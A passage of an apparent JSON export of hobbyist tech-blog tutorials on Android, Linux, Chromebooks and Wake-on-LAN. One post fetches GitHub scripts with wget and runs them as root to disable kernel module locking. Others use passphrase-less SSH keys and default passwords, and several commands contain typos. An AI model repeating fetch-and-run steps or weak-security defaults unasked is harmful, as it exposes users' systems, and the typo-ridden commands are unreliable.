            "steam",
            "stream",
            "stream steam chromebook",
            "streaming"
        ]
    },
    {
        "uri": "/cast-android-screen-to-pc/",
        "title": "Cast Android Screen to PC",
        "content": "{{ youtube 8Gzy-2M9i00 }}\r\n\r\nHave you ever had a moment where you wish that you could view a picture/video or even a game on a display larger than your phone? Maybe you haven&#8217;t, but it&#8217;s still something really cool to try it. This tutorial will take you through the basics on how to casts Android screen to PC.\r\n\r\nBefore we begin, I do want to mention that those of you who are using one of the latest Samsung phones already have this feature built in. All you need to do is go into screen mirror in your quick panel and choose a receiver (such as a Chromecast, Roku, Amazon Fire TV, etc). Of course, this guide is still useful if you specifically want to set up your computer as a receiver for this media as well.\r\n\r\n&nbsp;\r\n\r\nWhat You Will Need:\r\n\r\n  a href=\"https://play.google.com/store/apps/details?id=com.koushikdutta.mirror\" target=\"_blank\"Mirror Beta/a\r\n  a href=\"https://chrome.google.com/webstore/detail/allcast-receiver/hjbljnpdahefgnopeohlaeohgkiidnoe?utmsource=chrome-ntp-icon\" target=\"blank\"All Cast Receiver/a\r\n\r\nFirst, make sure that you have Google Chrome installed on your computer because the All Cast Receiver is a Chrome plugin.\r\n\r\n\r\n\r\nAfter you install the plugin, you will need to open up the port 53515 in Windows Firewall so that the Mirror Beta app can detect the receiver on your computer. Go to Windows Firewall and add a new inbound rule. First select the option TCP and enter in the port number. Then repeat the process using UDP.\r\n\r\n\r\n\r\nFinally, download the Mirror Beta app on your Android device. When you launch it, it should display the computer that has the receiver running (make sure the phone and computer are on the same WiFi network). Click the connection to begin casting.\r\n\r\n\r\n\r\nOverall, the performance was better than expected. The latency wasn&8217;t that bad, as I was able to stream videos with very little frame drop to my PC. Unfortunately, there is no sound and the window will only maximize to a small square. Gaming worked as well, but there were noticeable frame drops when lots of action was happening on the screen.\r\n\r\n\r\n",
        "tags": [
            "android",
            "cast",
            "pc",
            "screen",
            "sharing",
            "streaming"
        ]
    },
    {
        "uri": "/connect-android-to-ethernet/",
        "title": "Connect Android to Ethernet",
        "content": "Do you want to get the fastest speed available on your Android device? Sure, LTE is fast and all but you&#8217;re hit with really small data caps. WiFi doesn&#8217;t impose the same limitations, but the speed is never consistent. So why not just connect Android to Ethernet?\n\nspan style=\"line-height: 1.5;\"Luckily, Android Marshmallow comes to the rescue. Android Marshmallow introduces new drivers that allow you to connect your Android device directly to an Ethernet cable without needing root! So far I tested this on my Nexus 5X and it worked without any problems. Let&#8217;s check out how to connect Android to Ethernet:/span\n\n{{ ad }}\n\nWhat You&8217;ll Need:\n\n  Android Device Running Marshmallow\n  a href=\"http://www.amazon.com/s/ref=nbsbnoss2?url=search-alias%3Daps&field-keywords=usb+otg\" target=\"blank\" rel=\"noopener\"USB OTG Cable/a\n  a href=\"http://www.amazon.com/s/ref=nbsbnoss2?url=search-alias%3Daps&field-keywords=usb+to+ethernet&rh=i%3Aaps%2Ck%3Ausb+to+ethernet\" target=\"blank\" rel=\"noopener\"USB to Ethernet/a\n\nTo do this, connect your Ethernet cable to the USB to Ethernet adapter.\n\nThen connect the adapter to the USB OTG cable, and connect that USB OTG cable to your phone.\n\nYou should see the Ethernet icon in the upper right hand corner.\n\nNow, all your data (including games, video, downloads, etc) will go through the Ethernet connection. Run a a href=\"https://play.google.com/store/apps/details?id=org.zwanoo.android.speedtest\" target=\"_blank\" rel=\"noopener\"speed test/a to make sure that you are getting your full internet speed.\n\n{{ ad }}\n",
        "tags": [
            "android",
            "ethernet",
            "internet",
            "otg",
            "usb"
        ]
    },
    {
        "uri": "/fallout-4-tweaks/",
        "title": "Fallout 4 Tweaks",
        "content": "{{ youtube o1URARqhV0k }}\r\n\r\nFallout 4 has been one of my favorite games of the year, but it isn&#8217;t perfect. Everyone is aware how&#8230;lacking&#8230; span class=\"_Xbe kno-fv\"Bethesda can be with their games. However, thanks to the modding community, many of the issues that you might encounter in Fallout 4 can be fixed./span\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nOne of the biggest complaints about Fallout 4 has been the FPS lock and not supporting 21:9 widescreen monitors. If you&#8217;re feeling adventurous, you can dig through the game&#8217;s ini file and adjust the values accordingly, but the easier solution would be to download the a href=\"http://www.nexusmods.com/fallout4/mods/102/?\" target=\"_blank\"Fallout 4 Configuration tool/a which allows to you use a simple GUI that will make Fallout 4 tweaks.\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nSome of the Key features of the Configuration tool include:\r\n\r\nDisable Intro Video\r\n\r\nYes, that little intro video before you get to the main menu is annoying and takes up unnecessary time. This tool lets you disable it.\r\n\r\n Uncap FPS\r\n\r\nSay good bye to the 60 FPS lock. Let your FPS reach its maximum potential. I&#8217;ve have this disabled from day one and have not encountered any problems within the game.\r\n\r\nAdjust FOV\r\n\r\nThe default FOV never bothered me, but I know a lot of people would prefer something not so close. I adjust my vFOV value to 85 for comfortable viewing.\r\n\r\n Resolution Fix\r\n\r\nIf you are using a monitor with an Ultra High resolution, than this will allow you to input your custom resolution. Also good for people like me with UWS displays.\r\n\r\nMouse Sensitivity\r\n\r\nGet better mouse sensitivity in game and also gamepad support.\r\n\r\n Auto Save Interval\r\n\r\nIf the default auto save interval is too short for you, this will allow you to easily increase or decrease the occurrence.\r\n",
        "tags": [
            "configuration",
            "fallout",
            "fallout 4",
            "mods",
            "tweaks"
        ]
    },
    {
        "uri": "/lock-computer-android/",
        "title": "Lock Computer from Android",
        "content": "Consider this, you are sitting across the room chilling on your couch and you&#8217;re starting to fall asleep. Here&#8217;s the problem, your couch feels so good and you don&#8217;t want to get up to lock your computer, but you need to because you have nosy roommates. So wouldn&#8217;t it be great if you could remotely lock it from your phone? Okay, so even if this situation is completely unbelievable, this is still something cool to try and do. Here&#8217;s how to lock computer from Android.\n\nWhat You Will Need:\n\n  a href=\"https://drive.google.com/uc?export=download&id=0B5e37-FvY5lPMFpWZjZpejhPSE0\" target=\"_blank\" rel=\"noopener\"Lock My Computer Desktop App/a\n  a href=\"https://play.google.com/store/apps/details?id=bennett.dave.lockmycomputer\" target=\"_blank\" rel=\"noopener\"Lock My Computer Android app/a\n\nFirst, download the Lock My Computer desktop app. You will need to make sure that you have java installed on your computer for it to run. When you launch it, Windows might prompt you to allow it Internet access, click allow. Then hit start service. It will open up a port that you will connect to from your phone (take note of the port number).\n\n&nbsp;\n\nYou will also need to know your computer&8217;s ip address. To find it out go to command prompt and type in &#8220;ipconfig&#8221;. It will display your ip address under ip4 or ip6 address.\n\nFinally, download the app from the Play Store. Go into settings and type in your ip address and port number and hit save. _Make sure that your phone and computer are on the same wifi network._ When you tap lock, your computer should lock.\n",
        "tags": [
            "android",
            "computer",
            "lock",
            "windows"
        ]
    },
    {
        "uri": "/how-to-build-a-supercomputer/",
        "title": "How to build a Supercomputer",
        "content": "{{ youtube F8U4TrOlwEQ }}\r\n\r\nSo you want to build a supercomputer?  Well, if you checked out my video on quantum computing you&#8217;ll know that scientist are working to make computers stronger and faster than ever. Unfortunately, building a quantum computer is not something you can do at home, unless your home is a laboratory of course. All hope isn&#8217;t lost though, you can still go on to build your very own supercomputer. To do this, we will be making a Linux cluster. A cluster is a set of loosely or tightly connected computers that work together so that they can be viewed as a single system.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nFor this Linux cluster, we will be using the program called a href=\"https://www.mpich.org/\" target=\"_blank\"MPICH/a. MPICH is an implmentation of the Message Passing Interface (MPI) standard. This system is widely used in parallel computing in order to pass information to different worker nodes on the network. One thing to note for this tutorial, I will not be making use of a shared file system. However, using a shared file system will make your life a lot easier. Without using a shared file system (as I will show below), you will need to have the file paths and usernames the same on both system. Now, let&#8217;s take a look at how to build a supercomputer.\r\n\r\nWhat You Will Need:\r\n\r\n  At least two devices running Linux\r\n  a href=\"http://www.mpich.org/downloads/\" target=\"_blank\"MPICH/a\r\n\r\nspan style=\"color: 999999;\"emI am going to assume that you are running a debian based distro/em/span\r\n\r\nStep 1: Download Prerequisites\r\n\r\nBefore we get started, you will need to make sure that you have the GCC, G++, Openssh and Fortran compiler installed. Type in the following:\r\n\r\npresudo apt-get update\r\n\r\nsudo apt-get upgrade\r\n\r\nsudo apt-get install gcc\r\n\r\nsudo apt-get install g++\r\n\r\nsudo apt-get install openssh-server\r\n\r\nsudo apt-get install gfortran/pre\r\n\r\n Step 2: Create New User\r\n\r\nNext, you need to create a new user and add them to the sudo group. Keep in mind, the username must be exactly the same on both systems (this is where using a shared file system would save some time).\r\n\r\npresudo adduser dave\r\n\r\nsudo adduser dave sudo/pre\r\n\r\n\r\n\r\nThis will create a new user called Dave and add him to the sudo group. Remember, repeat this process on all the other computers that you are planning to use in the final super computer (use the same username). Now log out and back in to that user.\r\n\r\nStep 3: Edit Hosts File\r\n\r\nTo make life a little easier, we are going to give names to all the computers on the network instead of just referring to them by their IP address. To do this, you must edit the host file. I am first going to install the nano text editor\r\n\r\npresudo apt-get install nano\r\n\r\nsudo nano /etc/hosts/pre\r\n\r\nMake sure that your hosts file looks similar to mine. Of course, replace the IP addresses (and names if you desire) to the appropriate values matching your network. Hit CRTL +O to save and CRTL + X to exit.\r\n\r\n\r\n\r\nTo test is type in the following:\r\n\r\npreping worker0/pre\r\n\r\nOf course, replace worker0 with whatever you called the other computer. It should be able to communicate with the other computer without failure.\r\n\r\n\r\n\r\n Step 4: Configure MPICH Program\r\n\r\nDownload the mpich.tar.gz file for your system. Unzip it using whatever method you like (I prefer just to use the gui).\r\n\r\n\r\n\r\nMake a directory in your home folder called mpich.\r\n\r\npremkdir mpich/pre\r\n\r\nThen navigate to the mpich.zip that you just extracted and run the configure file.\r\n\r\nprecd Downloads\r\n\r\ncd mpich.your.version\r\n\r\n./configure --prefix=/home/dave/mpich/pre\r\n\r\nThis will configure the files and put them in the mpich folder that you made in your home directory. Now, make the program:\r\n\r\npremake\r\n\r\nmake install/pre\r\n\r\nFinally, copy the examples folder (located inside the mpich.your.version.tar.gz that you extracted) and moved that to the MPICH folder inside of your home directory. I am going to use the GUI (explorer) rather than doing it from terminal.\r\n\r\n**\\*\\*Remember, all of these steps must be repeated on all Systems on the network\\*\\***\r\n\r\nStep 5: Bashrc\r\n\r\nNext, you need to export that paths to your .bashrc file.In your home directory type in the following:\r\n\r\nprenano .bashrc/pre\r\n\r\nAt the bottom of the file, add in the following lines:\r\n\r\npreexport PATH=/home/dave/mpich/bin:$PATH\r\n\r\nexport PATH\r\n\r\nLDLIBRARYPATH=\"/home/dave/mpich/lib:$LD_LIBRARY)PATH\"\r\n\r\nexport LDLIBRARYPATH/pre\r\n\r\nThen, type CRTL + O to save and CRTL + X to exit.\r\n\r\n\r\n\r\nTo test that it works type in:\r\n\r\nprewhich mpicc/pre\r\n\r\nYou should see the folder path. Do it again with mpiexec\r\n\r\nprewhich mpiexec/pre\r\n\r\n\r\n\r\n Step 6: Processor file\r\n\r\nWe need to have a file that specifies to MPICH the computers on the network and the number of processes that we want them to handle. Navigate to the MPICH directory in your home folder. Create a file (I&#8217;ll call it hosts) and within that file identify the computer name with the number of processes.\r\n\r\nprecd Mpich\r\n\r\nnano hosts/pre\r\n\r\nThen, type CRTL + O to save and CRTL + X to exit.\r\n\r\n\r\n\r\nStep 7: Password-less SSH\r\n\r\nThe final thing that we need to do is make sure that you can connect via ssh to the other computer(s) without needing a password. Let&8217;s generate the ssh key.\r\n\r\npressh-keygen/pre\r\n\r\nKeep all the following values default and don&#8217;t specify a pass phrase. Finally, type in:\r\n\r\npressh-copy-id worker0/pre\r\n\r\nReplace &#8220;worker0&#8221; with the appropriate computer on your network. This will copy the ssh-key to that computer. It might prompt you to log in using the password for the first-time. In any case, try to ssh into that computer and make sure that you don&#8217;t need to enter a password.\r\n\r\npressh worker0/pre\r\n\r\nIf it works, type &#8220;exit&#8221; to exit the ssh.\r\n\r\nStep 8: Testing\r\n\r\nNow it&8217;s time for us to test the super computer. Just to summarize, the above steps were all so that we can set up all the computers to effectively communicate to each other on the network using the MPICH interface. Navigate to the Examples folder inside of the Mpich directory in your home folder and run the pi example program. Within the run command, you can specify the number of processes that you want to use:\r\n\r\nprecd Mpich\r\n\r\ncd Examples\r\n\r\nmpi exec -n 4 -f /home/dave/mpi/hosts ./cpi/pre\r\n\r\nIf everything works, you should see a similar output.\r\n\r\n\r\n\r\nAs you can see, the computer splits up the tasks to each individual computer on the network. Now keep in mind, this is just a simple program that calculates the absolute value of pi. Imagine if we developed a more complex program with many devices on the network, this would be extraordinary!\r\n\r\n&nbsp;\r\n",
        "tags": [
            "build",
            "computer",
            "how to",
            "linux",
            "supercomputer",
            "tutorial",
            "ubuntu"
        ]
    },
    {
        "uri": "/install-kodi-on-chromebook/",
        "title": "Install Kodi on Chromebook",
        "content": "Kodi (formely Xbmc) has become a popular in-home media platform. Luckily, getting it on your Chromebook is not much of a challenge. However, you will need to make sure that you have a href=\"http://www.davebennett.tv/install-ubuntu-14-04-on-chromebook/\" target=\"_blank\" rel=\"noopener\"Linux installed on your Chromebook/a first. Here&#8217;s a short video on how to install Kodi on Chromebook.\n\nTerminal commands:\n\npresudo apt-get install software-properties-common\nsudo add-apt-repository ppa:team-xbmc/ppa\nsudo apt-get update\nsudo apt-get install kodi/pre\n",
        "tags": [
            "chrome",
            "chrome os",
            "chromebook",
            "kodi",
            "linux",
            "ubuntu",
            "xbmc"
        ]
    },
    {
        "uri": "/run-linux-on-android/",
        "title": "Run Linux on Android",
        "content": "One of the coolest things that you could possibly do with your Android device is to run Linux on it (A full desktop operating system, in the palm of your hand). If you are asking yourself what Linux is exactly, this might help give you a quick explanation.\n\nSo what advantages would you get out of running Linux on your Android device? Well, besides doing things like running a a href=\"http://www.davebennett.tv/run-minecraft-server-on-android/\" target=\"blank\" rel=\"noopener\"Minecraft server /aand a href=\"http://www.davebennett.tv/create-your-own-personal-cloud-server/\" target=\"blank\" rel=\"noopener\"building your own cloud/a, you have a full suite of applications and&#8230;.dare I say&#8230;penetration testing tools at your disposal. The possibilities are endless. To do this, you will need to have a rooted Android device. If you are running Android Marshmallow (6.0) and perhaps even Lollipop (5.0) you will also need to make sure that you have a custom kernel installed. a href=\"http://forum.xda-developers.com/google-nexus-5/orig-development/kernel-elementalx-n5-0-44-t2519607\" target=\"_blank\" rel=\"noopener\"I am using ElementalX on my Nexus 5/a.\n\n{{ ad }}\n\nWhat You Will Need:\n\n  Rooted Android Device\n  a href=\"https://play.google.com/store/apps/details?id=ru.meefik.busybox\" target=\"_blank\" rel=\"noopener\"Busybox Installer/a\n  a href=\"https://play.google.com/store/apps/details?id=ru.meefik.linuxdeploy\" target=\"_blank\" rel=\"noopener\"Linux Deploy/a\n  a href=\"https://play.google.com/store/apps/details?id=com.realvnc.viewer.android\" target=\"_blank\" rel=\"noopener\"VNC Viewer (optional)/a\n\nFirst, download and install the BusyBox Installer app. The purpose of BusyBox is to provide most of the standard Unix tools.\n\nAfterwards, download and install Linux deploy. Within the app, go to the configuration panel (hit the button next to the stop button at the bottom). From here, you can configure that distribution that you want to use, along with the suite and desktop environment. I am going to stick with the default Debian distribution and keep LXDE for my desktop environment. Click install _to begin the process of downloading and installing Linux. Once it&8217;s done, select _start. This will start up the Linux environment. You can either access it through a SSH shell(using port 22, with the default password set as&#8221;changeme&#8221;)  or through a VNC.\n\nTo access through a VNC, download VNC viewer and set the address to localhost:5900. When you connect for the first time, it will prompt you for a password. The default password is changeme.\n\n&nbsp;\n",
        "tags": [
            "android",
            "emulation",
            "linux",
            "linux on android",
            "root"
        ]
    },
    {
        "uri": "/remix-os-on-chromebook/",
        "title": "Remix OS on Chromebook",
        "content": "{{ youtube n_DniWzfVus }}\r\n\r\nIt seems like everyone has been talking about a href=\"http://www.jide.com/en/remixos-for-pc\" target=\"_blank\"Remix OS /alately. If you aren&#8217;t up to date, Remix OS is another implementation of the Android x86 poject. The goal of the project is to get Android running on desktops.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nIn the video above, I took a brief look at the state of Remix OS. The tl;dr is that it&#8217;s well designed and offers a nice stylish edge over the normal stock Android UI. It tries really hard to mimic many of the archetypes we have come to expect from a typical Windows desktop. However, I can&#8217;t say that I fully realize the potential of Android on desktop computers. In any case, you can get this to run on any x86 Chromebook. I will warn you, the performance seemed to be a little disappointing on my Chromebook, but ymmv. Let&#8217;s take a look at how to install Remix OS on Chromebook.\r\n\r\nWhat You Will Need:\r\n\r\n  x86 Chromebook\r\n  a href=\"http://www.jide.com/en/remixos-for-pcdownloadNow\" target=\"_blank\"Remix OS (Legacy)/a\r\n  USB Flash drive\r\n\r\nInstallation:\r\n\r\nBefore we begin, first make sure that a href=\"http://www.davebennett.tv/enable-developer-mode-on-chromebook/\" target=\"_blank\"your Chromebook has developer mode enabled along with USB booting/a. Then download Remix OS from the link provided, make sure that you download the Legacy package and not the one for UEFI bios. After it&8217;s done downloading, run the installer in the zip; it should be very self-explanatory.  It will wipe all the contents from your flash drive and install Remix OS to it.\r\n\r\nFinally, power on your Chromebook and hit CRTL + L when you get to the developer screen; this will bring up the legacy bios. Hit ESC to bring up the bootmenu and choose your USB. From there, you can either choose resident mode or guest mode (Resident mode will only put the changes on your flash drive and will not have any affect on Chrome OS).\r\n\r\n\r\n",
        "tags": [
            "chromebook",
            "developer mode",
            "remix",
            "remix os"
        ]
    },
    {
        "uri": "/how-to-install-linux/",
        "title": "How to Install Linux",
        "content": "{{ youtube TkxBKFJZnBA }}\r\n\r\nNow that you are familiar with Linux, how do you go about installing it? Well, the beauty of Linux is that there are many different flavors at your disposal, in the form of distributions. Each distribution offers its own pre-installed software and default desktop and environment. There are thousands of different Linux distributions to choose from. If you are looking for a distribution that fits your needsa href=\"https://www.linux.com/news/software/applications/810295-the-top-11-best-linux-distros-for-2015\" target=\"_blank\", check out this list of the top 11 best Linux distributions/a.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nFor this tutorial we are going to install one of the most delover rated/del popular Linux distributions, Ubuntu. One of the reasons why I love Ubuntu so much is that the setup process is very straightforward and takes no more than 10 minutes. So here&#8217;s how to install Linux &#8211; Ubuntu.\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\nWhat You Will Need:\r\n\r\n  USB Flash Drive\r\n  Computer that supports booting from USB\r\n  a href=\"http://www.ubuntu.com/desktop\" target=\"_blank\"Ubuntu.iso/a\r\n  a href=\"http://www.pendrivelinux.com/universal-usb-installer-easy-as-1-2-3/\" target=\"_blank\"Universal USB Installer/a\r\n\r\n Step 1: Setup ISO\r\n\r\nAfter downloading the iso, unpack it to your flash drive using the Universal USB installer tool. Select &#8220;Ubuntu&#8221; as your distribution, then select your iso, and finally select your flash drive.\r\n\r\n\r\n\r\nStep 2: Installation\r\n\r\nBoot your computer from your flash drive (usually F12 brings up the boot menu). Then select the option to install Ubuntu. From this point, everything else is self-explanatory.\r\n\r\n\r\n\r\n span style=\"color: #808080;\"Installation Location/span\r\n\r\nIf you go to the something else option like I did, make sure that you choose the correct hard drive that you want to install Ubuntu to. Delete any existing partitions and begin creating new ones. Remember, you need a Swap and root. Your swap should be roughly twice the size of your RAM. Its worth noting that you don&#8217;t need to make a separate _home /etc _partition, unless you really want to.\r\n\r\n\r\n",
        "tags": [
            "install",
            "linux",
            "tutorial",
            "ubuntu"
        ]
    },
    {
        "uri": "/remotely-turn-on-computer-with-linux/",
        "title": "Remotely Turn on Computer with Linux",
        "content": "{{ youtube 2vP7z0X0NUc }}\r\n\r\nI really wish more people used WOL. It is probably one of the most underrated things in the world of wired networking. If you aren&#8217;t familiar, WOL (Wake on Lan) allows you to remotely turn on your computer. This could be from another computer or even your Android device. It works by supplying a little bit of power to your Ethernet card to allow it to listen for the &#8220;wake up&#8221; signal.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nUnfortunately, not every motherboard supports WOL. So you will have to browse your motherboard&#8217;s bios to see if it is available.  For this tutorial, I am going to show you how to do this with Linux. I have a (old) a href=\"https://www.youtube.com/watch?v=pDjjMO3az84\" target=\"_blank\"Windows tutorial if you are running Windows/a.\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\nWhat You Will Need:\r\n\r\n  Computer Running Linux\r\n  a href=\"https://play.google.com/store/apps/details?id=co.uk.mrwebb.wakeonlan\" target=\"_blank\"Wake On Lan Android Client (Optional)/a\r\n\r\n How To:\r\n\r\nFirst, you need to download ethtool:\r\n\r\nsudo apt-get install ethool\r\n\r\nNext, check to see if your Ethernet card support wake on lan:\r\n\r\nsudo ethtool eth0\r\n\r\nIf you see g _next to _Wake-on, then you are good to go. If you see something else (d) then type in the following:\r\n\r\nsudo ethool -s eth0 g\r\n\r\nFinally, we need to add a line in the network interfaces:\r\n\r\nsudo nano /etc/network/interfaces\r\n\r\nAdd the following:\r\n\r\nup ethool -s eth0 wol g\r\n\r\nThat&#8217;s it!\r\n",
        "tags": [
            "computer",
            "linux",
            "remotely",
            "remotely turn on computer",
            "turn on",
            "ubuntu",
            "wake on lan",
            "wol"
        ]
    },
    {
        "uri": "/mac-os-on-chromebook/",
        "title": "Mac OS on Chromebook",
        "content": "Do you ever come across some crazy ideas? Well, this is certainly one of them. Running Mac OS on Chromebook is a lot easier than you think. Now keep in mind, you aren&#8217;t going to be able to do anything intensive on this. This is more a proof concept (like a lot of things that I do) and something just to admire.\n\nTo do this, we are going to be doing some very convoluted emulation. Essentially, we are going to be running Mac OS via Virtual Box on Linux. So first, make sure that you have a href=\"http://www.davebennett.tech/install-ubuntu-14-04-on-chromebook/\" target=\"_blank\" rel=\"noopener\"Linux installed on your Chromebook/a. Also, you&#8217;re going to need to have a Mac OS ISO file. Here&#8217;s how to run Mac OS on Chromebook:\n\n{{ ad }}\n\nWhat You Will Need:\n\n  a href=\"http://www.davebennett.tech/install-ubuntu-14-04-on-chromebook/\" target=\"_blank\" rel=\"noopener\"Chromebook with Linux/a\n  Mac OS ISO\n  10GB of Storage either on external USB or Chromebook\n\n Step 1: Enable Virtual Box Addons in Chrome\n\nThe hardest part of this tutorial will be getting virtual box to function properly inside of Linux. Since this is all running from the Chrome OS kernel, there are some modifications that will need to be made for VirtualBox to load. Open up the shell and type in the following:\n\npreshell\ncd ~/Downloads\nwget https://raw.githubusercontent.com/divx118/crouton-packages/master/change-kernel-flags\nsudo sh ~/Downloads/change-kernel-flagscode\n /code/pre\n\nThis will download a script that will disable module_locking so that the modules can be loaded from outside of Chrome OS.\n\nimg class=\"alignnone wp-image-1384 size-large\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/setup-kernel-1024x576.jpg\" alt=\"Setup Kernel\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/setup-kernel-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/setup-kernel-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/setup-kernel-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/setup-kernel.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n\nNow, start up your Linux environment:\n\npresudo startunity/pre\n\nOpen up terminal and type in the following:\n\nprecd ~\n wget https://raw.githubusercontent.com/divx118/crouton-packages/master/setup-headers.sh\n sudo sh setup-headers.sh/pre\n\nThis will download and execute a script that will install the Linux headers and image and also load the virtual box modules. For more information about the above scripts, a href=\"https://github.com/divx118/crouton-packages/blob/master/README.md\" target=\"_blank\" rel=\"noopener\"refer to the github./a You might need to reboot after this step.\n\nimg class=\"alignnone size-large wp-image-1383\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/headers-1024x576.jpg\" alt=\"Setup Headers Linux\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/headers-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/headers-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/headers-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/headers.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n\nStep 2: Download and Install Virtualbox\n\n{{ ad }}\n\nNow download a href=\"https://www.virtualbox.org/wiki/LinuxDownloads\" target=\"blank\" rel=\"noopener\"VirtualBox for Linux/a. Choose to open it up with the Ubuntu Software center (apt-get install software-center if you don&8217;t have it) to install it.\n\nimg class=\"alignnone size-large wp-image-1382\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/install-virtualbox-1024x576.jpg\" alt=\"Download and Install VirtualBox\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/install-virtualbox-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/install-virtualbox-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/install-virtualbox-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/install-virtualbox.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n\nStep 3: Setting up the VM\n\nOpen up VirtualBox and create a new virtual machine.\n\nimg class=\"alignnone size-large wp-image-1381\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/name-1024x576.jpg\" alt=\"New Virtual Machine\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/name-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/name-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/name-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/name.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n\nMake sure that the amount of RAM that you allocate to the VM is less than 1 GB( or somewhere in the green area). Not leaving enough RAM for Chrome OS and Ubuntu will cause the VM to crash.\n\nimg class=\"alignnone size-large wp-image-1380\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/Ram-amount-1024x576.jpg\" alt=\"Virtual Machine Ram AMount\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/Ram-amount-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/Ram-amount-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/Ram-amount-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/Ram-amount.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n\nNext, create a new virtual disk image. The recommended size is 20GB. If yo don&8217;t have enough space available on your Chromebook you can install the image to a USB flash drive. Just be aware that your read and write times will be slower.\n\nimg class=\"alignnone size-large wp-image-1379\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/virtual-disk-image-1024x576.jpg\" alt=\"virtual disk image\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/virtual-disk-image-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/virtual-disk-image-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/virtual-disk-image-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/virtual-disk-image.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n\nimg class=\"alignnone size-large wp-image-1378\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/virtual-disk-image-2-1024x576.jpg\" alt=\"VirtualBox Virtual Disk Image\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/virtual-disk-image-2-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/virtual-disk-image-2-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/virtual-disk-image-2-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/virtual-disk-image-2.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n\nimg class=\"alignnone size-large wp-image-1377\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/dynamic-1024x576.jpg\" alt=\"Dyanamically Allocated\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/dynamic-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/dynamic-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/dynamic-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/dynamic.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n\nWithin the settings of your VM, uncheck the boxes Enable Efi and Hardware Clock.\n\nimg class=\"alignnone size-large wp-image-1375\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/system-1024x576.jpg\" alt=\"Virtual Box Mac OS Settings\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/system-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/system-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/system-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/system.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n\nUnder display, allocate the maximum amount of video memory available.\n\nimg class=\"alignnone size-large wp-image-1374\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/display-1024x576.jpg\" alt=\"Virtual Box Mac OS Settings\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/display-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/display-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/display-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/display.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n\n{{ ad }}\n\nUnder Storage, add an optical drive and choose the location of your Mac OS iso file.\n\nimg class=\"alignnone size-large wp-image-1373\" 